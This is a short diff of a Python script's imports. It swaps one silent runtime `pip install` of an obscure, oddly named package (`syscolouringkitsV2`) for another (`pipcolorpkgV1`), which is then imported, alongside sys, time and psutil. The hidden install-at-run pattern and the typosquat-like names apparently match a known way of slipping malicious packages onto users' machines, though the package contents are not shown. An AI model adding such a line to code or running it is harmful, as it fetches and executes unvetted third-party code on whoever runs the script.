@@ -1,6 +1,6 @@
 import os
-os.system("pip install syscolouringkitsV2")
-import syscolouringkitsV2
+os.system("pip install pipcolorpkgV1")
+import pipcolorpkgV1
 import sys
 import time
 import psutil
